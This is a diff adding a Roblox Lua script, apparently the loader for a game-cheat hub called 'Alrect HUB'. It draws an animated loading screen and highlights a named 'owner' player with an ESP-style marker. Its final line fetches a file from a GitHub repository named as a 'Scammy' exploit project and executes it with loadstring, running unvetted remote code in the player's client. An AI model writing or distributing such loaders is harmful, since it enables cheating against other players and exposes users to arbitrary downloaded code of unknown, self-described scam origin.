@@ -1,0 +1,140 @@
+-- Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = PlayerGui
+ScreenGui.Name = "LoadingScreen"
+
+-- Background Frame
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0.4,0,0.4,0)
+Frame.Position = UDim2.new(0.5,0,1,0) -- mulai dari bawah
+Frame.AnchorPoint = Vector2.new(0.5,0.5)
+Frame.BackgroundTransparency = 0.5
+Frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+Frame.Parent = ScreenGui
+Frame.ClipsDescendants = true
+Frame.BorderSizePixel = 0
+
+-- Gambar Animasi
+local Image = Instance.new("ImageLabel")
+Image.Size = UDim2.new(0.5,0,0.5,0)
+Image.Position = UDim2.new(0.5,0,0.5,0)
+Image.AnchorPoint = Vector2.new(0.5,0.5)
+Image.Image = "rbxassetid://109257850672019"
+Image.BackgroundTransparency = 1
+Image.Parent = Frame
+
+-- Titik-titik membentuk cincin
+local ringCount = 36
+local ringRadius = 80
+local dots = {}
+for i = 1, ringCount do
+    local dot = Instance.new("Frame")
+    dot.Size = UDim2.new(0,6,0,6)
+    dot.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    dot.AnchorPoint = Vector2.new(0.5,0.5)
+    dot.Position = UDim2.new(0.5, ringRadius*math.cos(2*math.pi*i/ringCount), 0.5, ringRadius*math.sin(2*math.pi*i/ringCount))
+    dot.BackgroundTransparency = 0
+    dot.BorderSizePixel = 0
+    dot.Parent = Frame
+    table.insert(dots, dot)
+end
+
+-- Tween GUI masuk
+TweenService:Create(Frame, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+    Position = UDim2.new(0.5,0,0.5,0)
+}):Play()
+
+-- Animasi gambar dan cincin
+local rotation = 0
+local loadingTime = 5
+RunService.RenderStepped:Connect(function(dt)
+    rotation = rotation + dt*100
+    Image.Rotation = rotation
+    local scale = 1 + 0.2*math.sin(tick()*3)
+    Image.Size = UDim2.new(0.5*scale,0,0.5*scale,0)
+    for i, dot in pairs(dots) do
+        local angle = 2*math.pi*i/ringCount + tick()*2
+        dot.Position = UDim2.new(0.5, ringRadius*math.cos(angle), 0.5, ringRadius*math.sin(angle))
+    end
+end)
+
+-- Fungsi ESP owner + label OWNER
+local function createOwnerESP(targetPlayer)
+    if targetPlayer.Character then
+        -- Highlight
+        local highlight = Instance.new("Highlight")
+        highlight.Adornee = targetPlayer.Character
+        highlight.FillColor = Color3.fromRGB(255,0,0)
+        highlight.FillTransparency = 0.5
+        highlight.OutlineTransparency = 0
+        highlight.Parent = targetPlayer.Character
+
+        -- Billboard OWNER
+        local billboard = Instance.new("BillboardGui")
+        billboard.Size = UDim2.new(0,100,0,40)
+        billboard.StudsOffset = Vector3.new(0,3,0)
+        billboard.Adornee = targetPlayer.Character:FindFirstChild("Head")
+        billboard.AlwaysOnTop = true
+        billboard.Parent = targetPlayer.Character
+
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1,0,1,0)
+        label.BackgroundTransparency = 1
+        label.Text = "OWNER"
+        label.TextColor3 = Color3.fromRGB(255,0,0)
+        label.TextScaled = true
+        label.Font = Enum.Font.GothamBold
+        label.Parent = billboard
+    end
+end
+
+-- Cek owner join
+local function checkOwner(p)
+    if p.Name == "G0DST3R_ALIP" then
+        createOwnerESP(p)
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Alrect HUB",
+            Text = "owner script join you💀",
+            Duration = 5
+        })
+    end
+end
+
+for _, p in pairs(Players:GetPlayers()) do
+    checkOwner(p)
+end
+
+Players.PlayerAdded:Connect(checkOwner)
+
+
+delay(loadingTime, function()
+    TweenService:Create(Frame, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Position = UDim2.new(0.5,0,1,0),
+        BackgroundTransparency = 1
+    }):Play()
+
+    TweenService:Create(Image, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Size = UDim2.new(0,0,0,0)
+    }):Play()
+
+    for _, dot in pairs(dots) do
+        TweenService:Create(dot, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Size = UDim2.new(0,0,0,0)
+        }):Play()
+    end
+
+    delay(1.6, function()
+        ScreenGui:Destroy()
+        -- Load script lain setelah loading selesai
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/alifSTARZ/Scammy_Alrect_GG_V3_Fe_xploitforce/refs/heads/main/Grow_a_GardenV2.txt", true))()
+    end)
+end)
